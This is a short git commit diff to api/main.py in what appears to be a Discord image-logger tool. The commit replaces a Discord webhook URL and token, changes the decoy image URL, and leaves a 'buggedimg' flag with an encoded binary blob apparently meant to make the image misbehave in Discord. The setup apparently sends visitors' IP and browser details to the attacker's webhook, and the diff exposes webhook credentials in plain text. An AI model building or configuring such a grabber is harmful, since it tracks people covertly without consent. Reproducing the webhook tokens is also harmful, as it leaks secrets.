c551d3734376e6b77e953bdc028e538d2cff159d
karacsonyikornel8-spec <karacsonyikornel8@gmail.com>
2026-04-05 10:22:00 +0200

    Update main.py

--- api/main.py
+++ api/main.py
@@ -2,9 +2,9 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import httpx, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1490254442736521346/Stxer0ADRi_jvOSbuAZtNtMuT6kig0ITDKx1tSNv5KWaAhxFaGrpTCTVspxZLdUuamgV-'
+webhook = 'https://discord.com/api/webhooks/1349155542039400522/NmbDkDhaCWLOPl68KDhFglwx773fTCdfBsXYVO1dkMuVPrw5pBM4tmsXtK6ohCSDOhj-'
 
-bindata = httpx.get('https://static.vecteezy.com/system/resources/thumbnails/015/873/760/small/click-here-icon-in-flat-style-pointer-clicking-illustration-on-isolated-background-web-button-sign-business-concept-vector.jpgd').content
+bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
 buggedimg = False # Set this to True if you want the image to load on discord, False if you don't. (CASE SENSITIVE)
 buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 
